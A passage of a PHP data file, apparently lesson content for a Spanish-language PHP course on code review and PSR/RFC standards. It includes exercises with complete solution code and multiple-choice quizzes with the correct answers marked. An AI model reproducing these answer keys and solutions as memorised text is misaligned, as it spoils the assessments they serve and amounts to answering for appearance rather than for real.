                    'solution' => 'Instituir un marco riguroso de Code Review enfocado en vectores de alto impacto: 1) Correctitud de dominio y tipado estricto; 2) Eficiencia de I/O y persistencia (evitar flush() en bucles y consultas no indexadas); 3) Resiliencia y manejo de errores sin excepciones ocultas; 4) Superficie de ataque y sanitización de entradas; y 5) Acoplamiento y cohesión de componentes.',
                    'solution_label' => 'Auditoría Arquitectónica & Detección de Smells',
                ],
                'internals' => [
                    'title' => 'Dimensiones Críticas del Code Review de Nivel Senior',
                    'steps' => [
                        [
                            'phase' => '1. Verificación de Contratos y Tipado Estricto',
                            'description' => 'Confirmar la presencia obligatoria de declare(strict_types=1);, uso de tipos de retorno específicos, clases final o readonly por defecto, y ausencia de tipos mixtos (mixed) injustificados.',
                        ],
                        [
                            'phase' => '2. Análisis de I/O y Patrones de Persistencia',
                            'description' => 'Identificar llamadas síncronas innecesarias dentro de bucles, especialmente $entityManager->flush() dentro de foreach, invocaciones HTTP en bucles, o deserializaciones JSON masivas sin límites de tamaño.',
                        ],
                        [
                            'phase' => '3. Evaluación de Resiliencia y Manejo de Errores',
                            'description' => 'Asegurar que los bloques try-catch no silencien excepciones (empty catch o re-lanzar tipos genéricos sin causa), y que los errores de infraestructura se traduzcan en excepciones de dominio semánticas.',
                        ],
                        [
                            'phase' => '4. Seguridad Defensiva y Sanitización',
                            'description' => 'Comprobar que ninguna entrada externa se concatene directamente en strings de consulta SQL/DQL o comandos del sistema, forzando parámetros preparados y validación en fronteras de entrada.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'CodeReviewAnalyzer.php',
                    'title' => 'Analizador Estático de Reglas de Calidad y Anti-patrones en PHP 8.4',
                    'tag' => 'Automated Code Review Engine',
                    'code' => '<?php

declare(strict_types=1);

namespace App\Evaluations\Review;

use PhpParser\Error;
use PhpParser\Node;
use PhpParser\NodeTraverser;
use PhpParser\NodeVisitorAbstract;
use PhpParser\ParserFactory;

/**
 * Representa un hallazgo crítico detectado durante el análisis estático.
 */
final readonly class ReviewFinding
{
    public function __construct(
        public string $ruleId,
        public string $severity,
        public string $message,
        public int $line,
        public string $recommendation
    ) {}
}

/**
 * Visitador AST para detectar olores de código y antipatrones de rendimiento.
 */
class PerformanceAndSafetyVisitor extends NodeVisitorAbstract
{
    /** @var list<ReviewFinding> */
    private array $findings = [];
    private int $loopDepth = 0;

    public function enterNode(Node $node): ?int
    {
        // Rastrear profundidad de ciclos (foreach, for, while)
        if ($node instanceof Node\Stmt\Foreach_ || $node instanceof Node\Stmt\For_ || $node instanceof Node\Stmt\While_) {
            $this->loopDepth++;
        }

        // Regla 1: Detección de flush() dentro de ciclos
        if ($this->loopDepth > 0 && $node instanceof Node\Expr\MethodCall) {
            if ($node->name instanceof Node\Identifier && $node->name->toString() === "flush") {
                $this->findings[] = new ReviewFinding(
                    ruleId: "PERF-001",
                    severity: "CRITICAL",
                    message: "Llamada a flush() detectada dentro de un bucle de iteración.",
                    line: $node->getStartLine(),
                    recommendation: "Acumula las entidades y ejecuta flush() y clear() en lotes fuera del bucle para evitar I/O masivo."
                );
            }
        }

        // Regla 2: Detección de catch vacío (swallowing exceptions)
        if ($node instanceof Node\Stmt\Catch_) {
            if (count($node->stmts) === 0) {
                $this->findings[] = new ReviewFinding(
                    ruleId: "RESIL-002",
                    severity: "CRITICAL",
                    message: "Bloque catch vacío silenciando excepciones operacionales.",
                    line: $node->getStartLine(),
                    recommendation: "Registra la excepción en el LoggerInterface o relanza una excepción de dominio."
                );
            }
        }

        return null;
    }

    public function leaveNode(Node $node): ?int
    {
        if ($node instanceof Node\Stmt\Foreach_ || $node instanceof Node\Stmt\For_ || $node instanceof Node\Stmt\While_) {
            $this->loopDepth = max(0, $this->loopDepth - 1);
        }

        return null;
    }

    /**
     * @return list<ReviewFinding>
     */
    public function getFindings(): array
    {
        return $this->findings;
    }
}

/**
 * Servicio de orquestación de revisión de código.
 */
final class CodeReviewAnalyzer
{
    /**
     * @return list<ReviewFinding>
     */
    public function analyze(string $sourceCode): array
    {
        $parser = (new ParserFactory())->createForHostVersion();
        
        try {
            $ast = $parser->parse($sourceCode);
        } catch (Error $e) {
            return [
                new ReviewFinding(
                    ruleId: "SYNTAX-ERR",
                    severity: "BLOCKER",
                    message: sprintf("Error de sintaxis PHP: %s", $e->getMessage()),
                    line: $e->getStartLine(),
                    recommendation: "Corrige los errores de sintaxis antes de someter a revisión."
                ),
            ];
        }

        if ($ast === null) {
            return [];
        }

        $traverser = new NodeTraverser();
        $visitor = new PerformanceAndSafetyVisitor();
        $traverser->addVisitor($visitor);
        $traverser->traverse($ast);

        return $visitor->getFindings();
    }
}',
                ],
                'senior_mindset' => [
                    'thought_process' => 'Al revisar un Pull Request, el ingeniero Senior lee el código de afuera hacia adentro: primero comprende el problema de negocio en la descripción del PR, luego inspecciona las pruebas unitarias y de integración para validar el contrato esperado, y finalmente revisa la implementación técnica buscando cuellos de botella de concurrencia, efectos secundarios ocultos y riesgos de escalabilidad futura.',
                    'critical_questions' => [
                        '¿Qué sucede si este endpoint recibe 2,000 peticiones concurrentes? ¿Existe contención de locks en base de datos o llamadas a APIs externas que puedan bloquear los workers de PHP-FPM?',
                        '¿Cómo falla este código cuando el servicio dependiente no está disponible? ¿Hay degradación elegante (circuit breaker / fallback) o colapsará en cascada con un Error 500?',
                        '¿Se respetan las fronteras de encapsulación del dominio o este cambio expone detalles de persistencia a los controladores y capas de presentación?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Aprobación y retroalimentación de un Pull Request que introduce persistencia masiva de registros importados desde un archivo CSV.',
                    'junior' => [
                        'approach' => 'Revisa superficialmente el PR, verifica que "funcione" en entorno local y aprueba un foreach que ejecuta $em->persist($row) y $em->flush() en cada fila del archivo CSV.',
                        'flaws' => [
                            'Degradación catastrófica de I/O: miles de viajes de red individuales y transacciones redundantes que saturan la base de datos.',
                            'Consumo exponencial de memoria al retener todas las entidades en el Unit of Work sin llamar a clear().',
                            'Swallowing de excepciones: atrapa errores con catch vacíos para evitar que el script se detenga.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Identifica el cuello de botella de I/O y exige procesamiento por lotes con batching, aislamiento de transacciones y procesamiento en segundo plano con Symfony Messenger.',
                        'rationale' => [
                            'Rendimiento O(1) en memoria al vaciar y desasociar entidades periódicamente mediante $em->flush() y $em->clear().',
                            'Resiliencia operativa: las fallas de registros individuales se aíslan y se envían a Dead Letter Queues sin abortar el lote.',
                            'Mantenibilidad: el código se somete a linters de CI antes de llegar a la revisión humana de arquitectura.',
                        ],
                        'trade_offs' => 'Requiere diseñar DTOs intermedios y configurar colas asíncronas, pero garantiza escalabilidad para millones de registros.',
                    ],
                    'trade_offs' => 'Hacer un review exhaustivo requiere invertir entre 20 y 40 minutos por PR significativo, pero ahorra días enteros de debugging de incidentes críticos en producción y previene la degradación acumulativa de la base de datos.',
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de CodeSmellDetector',
                    'objective' => 'Implementar la clase CodeSmellDetector para analizar código fuente PHP y detectar cuatro antipatrones críticos de producción: ausencia de declare(strict_types=1), llamadas a flush() dentro de bucles, bloques catch vacíos, y concatenación insegura en sentencias SQL.',
                    'instructions' => 'Completa la clase CodeSmellDetector en el namespace App\\Evaluations\\Review. Implementa detectSmells(string $phpCode): array. 1) Si no contiene "declare(strict_types=1);", registra smell con type "missing_strict_types", severity "critical", y message descriptivo. 2) Si detecta "flush()" dentro de un bucle "foreach" o "for" (e.g. mediante regex o análisis de bloques), registra smell con type "flush_in_loop", severity "high", y message descriptivo. 3) Si detecta un bloque catch vacío (catch (...) { }), registra smell con type "empty_catch", severity "critical", y message descriptivo. 4) Si detecta concatenación directa de variables en consultas SQL (e.g. "SELECT ... " . $var o dentro de comillas dobles con variables sin prepared statements), registra smell con type "sql_injection_risk", severity "critical", y message descriptivo. Retorna array con: ["valid" => count($smells) === 0, "smells_count" => count($smells), "smells" => $smells]. Implementa además hasCriticalSmells(string $phpCode): bool, que retorne true si existe al menos un smell con severity "critical".',
                    'filename' => 'CodeSmellDetector.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Evaluations\\Review;\n\nclass CodeSmellDetector\n{\n    /**\n     * @return array{valid: bool, smells_count: int, smells: array<int, array{type: string, severity: string, message: string}>}\n     */\n    public function detectSmells(string \$phpCode): array\n    {\n        // TODO: Detectar missing_strict_types\n        // TODO: Detectar flush_in_loop\n        // TODO: Detectar empty_catch\n        // TODO: Detectar sql_injection_risk\n        // TODO: Retornar estructura valid, smells_count y smells\n        return [\n            'valid' => false,\n            'smells_count' => 0,\n            'smells' => [],\n        ];\n    }\n\n    public function hasCriticalSmells(string \$phpCode): bool\n    {\n        // TODO: Retornar true si algún smell tiene severity 'critical'\n        return false;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Evaluations\\Review;\n\nclass CodeSmellDetector\n{\n    /**\n     * @return array{valid: bool, smells_count: int, smells: array<int, array{type: string, severity: string, message: string}>}\n     */\n    public function detectSmells(string \$phpCode): array\n    {\n        \$smells = [];\n\n        // 1. Validar declare(strict_types=1);\n        if (!preg_match('/declare\\s*\\(\\s*strict_types\\s*=\\s*1\\s*\\)\\s*;/i', \$phpCode)) {\n            \$smells[] = [\n                'type' => 'missing_strict_types',\n                'severity' => 'critical',\n                'message' => 'Falta la directiva declare(strict_types=1); en el archivo.',\n            ];\n        }\n\n        // 2. Validar flush() en loops (foreach / for / while)\n        if (preg_match('/(foreach|for|while)\\s*\\([^)]*\\)\\s*\\{[^}]*->flush\\s*\\(/s', \$phpCode)) {\n            \$smells[] = [\n                'type' => 'flush_in_loop',\n                'severity' => 'high',\n                'message' => 'Llamada a flush() detectada dentro de un bucle. Utilizar procesamiento por lotes.',\n            ];\n        }\n\n        // 3. Validar catch vacío\n        if (preg_match('/catch\\s*\\([^)]*\\)\\s*\\{\\s*\\}/s', \$phpCode)) {\n            \$smells[] = [\n                'type' => 'empty_catch',\n                'severity' => 'critical',\n                'message' => 'Bloque catch vacío detectado silenciando excepciones operacionales.',\n            ];\n        }\n\n        // 4. Validar riesgo de SQL Injection por concatenación\n        if (\n            preg_match('/(SELECT|INSERT|UPDATE|DELETE)\\s+[^;\"]*[\'\"]\\s*\\.\\s*\\$/i', \$phpCode) ||\n            preg_match('/[\'\"](SELECT|INSERT|UPDATE|DELETE)\\s+[^;\"]*\\$[a-zA-Z_]/i', \$phpCode)\n        ) {\n            \$smells[] = [\n                'type' => 'sql_injection_risk',\n                'severity' => 'critical',\n                'message' => 'Posible inyección SQL detectada por concatenación directa de variables en la consulta.',\n            ];\n        }\n\n        return [\n            'valid' => count(\$smells) === 0,\n            'smells_count' => count(\$smells),\n            'smells' => \$smells,\n        ];\n    }\n\n    public function hasCriticalSmells(string \$phpCode): bool\n    {\n        \$result = \$this->detectSmells(\$phpCode);\n        foreach (\$result['smells'] as \$smell) {\n            if (\$smell['severity'] === 'critical') {\n                return true;\n            }\n        }\n\n        return false;\n    }\n}\n",
                    'explanation' => 'CodeSmellDetector demuestra cómo un análisis estático de reglas de negocio previene antipatrones severos de persistencia, seguridad y fiabilidad antes de que el código llegue a los entornos de producción.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Code Review de Nivel Senior & Métricas de Calidad',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál debe ser el foco primordial de un desarrollador Senior durante el proceso de revisión de código (Pull Request)?',
                            'options' => [
                                'a' => 'Discutir si las variables deben usar camelCase o snake_case y corregir saltos de línea.',
                                'b' => 'Validar la solidez del diseño arquitectónico, límites de dominio, seguridad contra ataques, resiliencia y el impacto del I/O en la escalabilidad del sistema.',
                                'c' => 'Comprobar que no haya comentarios en el código.',
                                'd' => 'Aprobar inmediatamente si los tests pasan en verde sin leer la implementación.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El formato y estilo de código deben delegarse a linters automáticos en el pipeline de CI. El valor insustituible del Code Review humano Senior radica en el análisis de arquitectura, concurrencia, seguridad y diseño de dominio.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué un bloque catch vacío (swallowing exception) es considerado un code smell crítico de nivel blocker?',
                            'options' => [
                                'a' => 'Porque hace que el archivo PHP pese más kilobytes.',
                                'b' => 'Porque silencia fallos operacionales sin registro alguno, corrompiendo el estado del sistema y haciendo que los errores en producción sean prácticamente imposibles de diagnosticar.',
                                'c' => 'Porque la sintaxis de PHP 8.4 prohíbe los bloques catch.',
                                'd' => 'Porque obliga al servidor Apache a reiniciarse.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Silenciar excepciones enmascara estados inconsistentes y bugs catastróficos. Una excepción siempre debe ser manejada adecuadamente, registrada con contexto estructurado o transformada en una excepción semántica de dominio.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es el peligro de invocar $entityManager->flush() dentro de un bucle de importación de miles de registros?',
                            'options' => [
                                'a' => 'Provoca un error de sintaxis en Doctrine.',
                                'b' => 'Desencadena un ciclo continuo de cálculo de ChangeSet y transacciones individuales de red hacia la base de datos por cada iteración, destruyendo el throughput y pudiendo agotar la memoria y el tiempo límite de ejecución.',
                                'c' => 'Borra la base de datos completa de forma irreversible.',
                                'd' => 'Fuerza a Doctrine a usar SQLite en lugar de MySQL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Cada llamada a flush() calcula el changeset de todas las entidades gestionadas y ejecuta transacciones SQL individuales. En bucles masivos debe aplicarse batch processing ($em->flush() y $em->clear() cada N registros).',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 17: LECCIÓN 1: Guía de RFCs & Estándares PSR
            // ==========================================
            'resources-php-rfcs' => [
                'slug' => 'resources-php-rfcs',
                'title' => 'Guía de RFCs & Estándares PSR',
                'module' => 'resources',
                'minutes' => 30,
                'difficulty' => 'Todos',
                'overview' => [
                    'concept' => 'Los estándares PHP-FIG (PHP Standard Recommendations) y el proceso de RFCs (Requests for Comments) de PHP Internals constituyen los dos pilares de modernización, interoperabilidad y estabilidad del ecosistema PHP contemporáneo. Comprender la evolución de los PSRs y las propuestas de internals permite a los ingenieros diseñar arquitecturas agnósticas, desacopladas de frameworks propietarios y preparadas para aprovechar al máximo las optimizaciones nativas de rendimiento del motor Zend.',
                    'problem' => 'Muchas bases de código sufren de acoplamiento severo a implementaciones propietarias de librerías o frameworks concretos (violando el principio de inversión de dependencias) y mantienen soluciones complejas obsoletas para problemas que PHP moderno ya resuelve de forma nativa mediante características aprobadas en RFCs oficiales (como Property Hooks, Enums, First-Class Callables o Asymmetric Visibility).',
                    'problem_label' => 'El Antipatrón del Acoplamiento Propietario y Deuda Técnica',
                    'solution' => 'Adoptar interfaces estándar PSR (PSR-3 para logging, PSR-7/PSR-15/PSR-17 para HTTP, PSR-11 para contenedores de inyección de dependencias, PSR-14 para eventos) en todas las capas de abstracción de dominio, y aplicar de manera proactiva las nuevas capacidades aprobadas en RFCs para reducir la complejidad accidental del código.',
                    'solution_label' => 'Arquitectura Basada en Contratos PSR y Primitivas RFC',
                ],
                'internals' => [
                    'title' => 'El Ciclo de Vida de los RFCs en PHP Internals y los Estándares PSR',
                    'steps' => [
                        [
                            'phase' => '1. Proceso de RFC en PHP Internals',
                            'description' => 'Una propuesta técnica (RFC) pasa por fases estrictas: Redacción inicial (Draft), discusión técnica pública en internals@lists.php.net, período formal de votación de 2 semanas (requiriendo mayoría de 2/3 para cambios de sintaxis o lenguaje), e implementación en C con pull request en php-src.',
                        ],
                        [
                            'phase' => '2. Estándares PSR de Mensajería HTTP y Middlewares',
                            'description' => 'PSR-7 define representaciones inmutables de Request y Response HTTP; PSR-17 proporciona factorías tipadas para construir dichos mensajes; y PSR-15 estandariza RequestHandlerInterface y MiddlewareInterface para crear tuberías de procesamiento HTTP universales.',
                        ],
                        [
                            'phase' => '3. Estándares PSR de Infraestructura y Observabilidad',
                            'description' => 'PSR-3 estandariza LoggerInterface con niveles de severidad RFC 5424 y mensajes interpolados con llaves {}; PSR-11 define ContainerInterface para resolución uniforme de dependencias; y PSR-14 desacopla la publicación y captura de eventos de dominio.',
                        ],
                        [
                            'phase' => '4. La Filosofía de Inmutabilidad y Tipado Estricto en PHP Moderno',
                            'description' => 'Los RFCs de PHP 8.1+ (Readonly Classes, Property Hooks en PHP 8.4, Asymmetric Visibility) y los PSRs contemporáneos convergen hacia objetos inmutables con invariantes blindadas y verificación exhaustiva de tipos en tiempo de compilación.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'PsrInteroperabilityRegistry.php',
                    'title' => 'Registro y Despachador Interoperable con Estándares PSR-3, PSR-11 y PSR-14 en PHP 8.4',
                    'tag' => 'Universal PSR Interoperability Architecture',
                    'code' => '<?php

declare(strict_types=1);

namespace App\Resources\Standards;

use Psr\Container\ContainerInterface;
use Psr\EventDispatcher\EventDispatcherInterface;
use Psr\Log\LoggerInterface;
use Psr\Log\LogLevel;
use InvalidArgumentException;

/**
 * Evento inmutable de estándar PSR para despacho desacoplado.
 */
final readonly class StandardRegisteredEvent
{
    public function __construct(
        public int $psrNumber,
        public string $name,
        public string $category,
        public float $timestamp = 0.0
    ) {}
}

/**
 * Servicio de orquestación desacoplada basado enteramente en interfaces PSR.
 */
class PsrInteroperabilityRegistry
{
    /** @var array<int, array{number: int, name: string, category: string, status: string}> */
    private array $standards = [];

    public function __construct(
        private readonly ?LoggerInterface $logger = null,
        private readonly ?EventDispatcherInterface $dispatcher = null,
        private readonly ?ContainerInterface $container = null
    ) {}

    public function registerStandard(int $number, string $name, string $category, string $status = "accepted"): void
    {
        if ($number <= 0) {
            throw new InvalidArgumentException("El número de PSR debe ser un entero positivo.");
        }

        $cleanName = trim($name);
        if ($cleanName === "") {
            throw new InvalidArgumentException("El nombre del estándar no puede estar vacío.");
        }

        $this->standards[$number] = [
            "number" => $number,
            "name" => $cleanName,
            "category" => trim($category),
            "status" => trim($status),
        ];

        // Logging estructurado compatible con PSR-3 (RFC 5424)
        $this->logger?->log(
            LogLevel::INFO,
            "Estándar PSR-{number} ({name}) registrado correctamente.",
            ["number" => $number, "name" => $cleanName, "category" => $category]
        );

        // Notificación de evento desacoplada mediante PSR-14
        $this->dispatcher?->dispatch(
            new StandardRegisteredEvent(
                psrNumber: $number,
                name: $cleanName,
                category: $category,
                timestamp: microtime(true)
            )
        );
    }

    /**
     * @return array{number: int, name: string, category: string, status: string}|null
     */
    public function getStandard(int $number): ?array
    {
        return $this->standards[$number] ?? null;
    }

    /**
     * Resuelve un servicio dependiente a través del contenedor PSR-11.
     */
    public function resolveDependency(string $serviceId): mixed
    {
        if ($this->container !== null && $this->container->has($serviceId)) {
            return $this->container->get($serviceId);
        }

        return null;
    }

    /**
     * @return array<int, array{number: int, name: string, category: string, status: string}>
     */
    public function getAllStandards(): array
    {
        return $this->standards;
    }
}',
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un ingeniero Senior no diseña librerías ni modelos de dominio acoplados a Symfony, Laravel o ningún framework específico. En su lugar, programa contra contratos PSR puros. Esto permite que el núcleo del negocio permanezca inmune a cambios de infraestructura, migraciones tecnológicas o decisiones corporativas durante más de una década.',
                    'critical_questions' => [
                        '¿Nuestras interfaces y servicios de dominio dependen de librerías de terceros o utilizan contratos estándar PSR universales?',
                        '¿Estamos utilizando las capacidades nativas aprobadas en RFCs recientes (e.g. Property Hooks en PHP 8.4) para eliminar capas innecesarias de getters/setters redundantes?',
                        '¿Cumplen nuestros registros de log con PSR-3 empleando contexto estructurado para integración transparente con sistemas de observabilidad (Elastic, Datadog, Prometheus)?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Diseño de un paquete compartido de autenticación y auditoría para ser consumido por 12 servicios distintos en la organización.',
                    'junior' => [
                        'approach' => 'Crea el paquete vinculándolo directamente con las clases concretas de Monolog y el contenedor de Symfony, escribiendo adaptadores propietarios ad-hoc para cada servicio.',
                        'flaws' => [
                            'Imposibilidad de utilizar el paquete en microservicios basados en Laravel o herramientas CLI independientes sin instalar todo Symfony.',
                            'Dificultad severa para realizar pruebas unitarias en aislamiento debido a dependencias rígidas de infraestructura.',
                            'Falta de interoperabilidad con estándares abiertos de telemetría y logging distribuido.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Diseña el paquete dependiendo exclusivamente de PSR-3 (LoggerInterface), PSR-11 (ContainerInterface) y PSR-7/15 (HTTP Messages & Middlewares), delegando la inyección de la implementación concreta a la aplicación consumidora.',
                        'rationale' => [
                            'Interoperabilidad absoluta: el paquete funciona en Symfony, Laravel, Slim o scripts independientes sin fricción.',
                            'Facilidad extrema de testeo: permite sustituir cualquier dependencia con implementaciones ligeras o nulas (NullLogger, InMemoryContainer).',
                            'Longevidad arquitectónica: el paquete no sufrirá rupturas por actualizaciones mayores de frameworks externos.',
                        ],
                        'trade_offs' => 'Requiere mayor rigor en la definición de contratos e interfaces de inyección de dependencias.',
                    ],
                    'trade_offs' => 'Invertir en estándares PSR requiere una curva de aprendizaje inicial para el equipo sobre especificaciones PHP-FIG, pero erradica el vendor lock-in y garantiza portabilidad total del código.',
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de PsrStandardRegistry',
                    'objective' => 'Implementar la clase PsrStandardRegistry en el namespace App\\Resources\\Standards para registrar, consultar y validar estándares PSR y compatibilidad de RFCs de PHP moderno.',
                    'instructions' => 'Completa la clase PsrStandardRegistry en el namespace App\\Resources\\Standards. Implementa los siguientes métodos: 1) registerPsr(int $number, string $name, string $type, string $status): void. Valida que $number > 0, que $name (tras trim) no esté vacío, que $type pertenezca a ["coding_standard", "interfaces", "http", "caching", "other"] y que $status pertenezca a ["accepted", "deprecated", "abandoned"]. Si alguna validación falla, lanza InvalidArgumentException. Almacena el PSR indexado por su número. 2) getPsr(int $number): ?array. Retorna el array del PSR registrado con keys ["number", "name", "type", "status"] o null si no existe. 3) listByType(string $type): array. Retorna la lista de PSRs registrados cuyo type coincida con el parámetro. 4) validatePhpFeatureRfc(string $featureName, string $minPhpVersion): bool. Valida que la versión de PHP en tiempo de ejecución (PHP_VERSION) sea mayor o igual que $minPhpVersion utilizando version_compare(PHP_VERSION, $minPhpVersion, ">="). Si la versión actual cumple con el requisito, retorna true; de lo contrario retorna false. 5) count(): int. Retorna la cantidad total de estándares PSR registrados.',
                    'filename' => 'PsrStandardRegistry.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Resources\\Standards;\n\nuse InvalidArgumentException;\n\nclass PsrStandardRegistry\n{\n    /**\n     * @var array<int, array{number: int, name: string, type: string, status: string}>\n     */\n    private array \$standards = [];\n\n    public function registerPsr(int \$number, string \$name, string \$type, string \$status): void\n    {\n        // TODO: Validar \$number > 0\n        // TODO: Validar \$name no vacío\n        // TODO: Validar \$type en ['coding_standard', 'interfaces', 'http', 'caching', 'other']\n        // TODO: Validar \$status en ['accepted', 'deprecated', 'abandoned']\n        // TODO: Guardar en \$this->standards[\$number]\n    }\n\n    /**\n     * @return array{number: int, name: string, type: string, status: string}|null\n     */\n    public function getPsr(int \$number): ?array\n    {\n        // TODO: Retornar PSR o null\n        return null;\n    }\n\n    /**\n     * @return array<int, array{number: int, name: string, type: string, status: string}>\n     */\n    public function listByType(string \$type): array\n    {\n        // TODO: Retornar lista filtrada por type\n        return [];\n    }\n\n    public function validatePhpFeatureRfc(string \$featureName, string \$minPhpVersion): bool\n    {\n        // TODO: Comparar con PHP_VERSION usando version_compare\n        return false;\n    }\n\n    public function count(): int\n    {\n        return count(\$this->standards);\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Resources\\Standards;\n\nuse InvalidArgumentException;\n\nclass PsrStandardRegistry\n{\n    private const array ALLOWED_TYPES = ['coding_standard', 'interfaces', 'http', 'caching', 'other'];\n    private const array ALLOWED_STATUSES = ['accepted', 'deprecated', 'abandoned'];\n\n    /**\n     * @var array<int, array{number: int, name: string, type: string, status: string}>\n     */\n    private array \$standards = [];\n\n    public function registerPsr(int \$number, string \$name, string \$type, string \$status): void\n    {\n        if (\$number <= 0) {\n            throw new InvalidArgumentException('El número de PSR debe ser un entero positivo.');\n        }\n\n        \$cleanName = trim(\$name);\n        if (\$cleanName === '') {\n            throw new InvalidArgumentException('El nombre del estándar PSR no puede estar vacío.');\n        }\n\n        \$cleanType = trim(\$type);\n        if (!in_array(\$cleanType, self::ALLOWED_TYPES, true)) {\n            throw new InvalidArgumentException(sprintf('Tipo no válido: \"%s\".', \$cleanType));\n        }\n\n        \$cleanStatus = trim(\$status);\n        if (!in_array(\$cleanStatus, self::ALLOWED_STATUSES, true)) {\n            throw new InvalidArgumentException(sprintf('Estado no válido: \"%s\".', \$cleanStatus));\n        }\n\n        \$this->standards[\$number] = [\n            'number' => \$number,\n            'name' => \$cleanName,\n            'type' => \$cleanType,\n            'status' => \$cleanStatus,\n        ];\n    }\n\n    /**\n     * @return array{number: int, name: string, type: string, status: string}|null\n     */\n    public function getPsr(int \$number): ?array\n    {\n        return \$this->standards[\$number] ?? null;\n    }\n\n    /**\n     * @return array<int, array{number: int, name: string, type: string, status: string}>\n     */\n    public function listByType(string \$type): array\n    {\n        \$result = [];\n        foreach (\$this->standards as \$standard) {\n            if (\$standard['type'] === \$type) {\n                \$result[] = \$standard;\n            }\n        }\n\n        return \$result;\n    }\n\n    public function validatePhpFeatureRfc(string \$featureName, string \$minPhpVersion): bool\n    {\n        return version_compare(PHP_VERSION, \$minPhpVersion, '>=');\n    }\n\n    public function count(): int\n    {\n        return count(\$this->standards);\n    }\n}\n",
                    'explanation' => 'PsrStandardRegistry proporciona un catálogo tipado de especificaciones estándar y validación de compatibilidad con versiones de PHP para garantizar que los módulos respeten los contratos del ecosistema.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Estándares PSR & Evolución del Ecosistema PHP',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué la especificación PSR-7 define que los objetos HTTP Message (Request y Response) deben ser inmutables?',
                            'options' => [
                                'a' => 'Porque los objetos mutables no pueden convertirse a JSON.',
                                'b' => 'Para garantizar predictibilidad y evitar efectos secundarios: en una tubería de middlewares, cada componente recibe una copia inalterada del estado y cualquier transformación produce una nueva instancia.',
                                'c' => 'Porque PHP 8.4 elimina los métodos setters de todas las clases.',
                                'd' => 'Para que el código solo pueda ejecutarse dentro de Apache.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'La inmutabilidad en PSR-7 erradica los errores sutiles de estado compartido entre middlewares, asegurando que ninguna capa intermedia modifique accidentalmente la petición sin devolver explícitamente un nuevo mensaje con withHeader() o withBody().',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es el beneficio de codificar las dependencias de una librería contra PSR-11 (ContainerInterface) en lugar de contra el contenedor específico de Symfony o Laravel?',
                            'options' => [
                                'a' => 'Duplica la velocidad del procesador.',
                                'b' => 'Permite que la librería sea agnóstica al framework: cualquier aplicación que implemente ContainerInterface (Symfony, Laravel, PHP-DI) puede suministrar sus dependencias sin acoplamiento a paquetes propietarios.',
                                'c' => 'Evita tener que usar namespaces en PHP.',
                                'd' => 'Obliga a que todos los servicios sean estáticos.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'PSR-11 estandariza una interfaz minimalista con has() y get(), permitiendo que librerías y componentes reutilizables interactúen con cualquier contenedor de inyección de dependencias de la industria.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué característica principal introdujo el RFC oficial de Property Hooks aprobado para PHP 8.4?',
                            'options' => [
                                'a' => 'Eliminó las variables con signo de dólar ($).',
                                'b' => 'Permite adjuntar lógica de lectura (get) y escritura (set) directamente en las propiedades de las clases, eliminando métodos getters/setters redundantes mientras se preserva el encapsulamiento.',
                                'c' => 'Hizo que PHP compilara a código ensamblador nativo en tiempo real.',
                                'd' => 'Permite ejecutar PHP en el navegador cliente sin WebAssembly.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Property Hooks en PHP 8.4 permite declarar hooks get y set directamente en la definición de la propiedad, reduciendo drásticamente el código boilerplate de getters y setters sin sacrificar la validación ni el encapsulamiento.',
                        ],
                    ],
                ],
            ],
        ];
    }
}
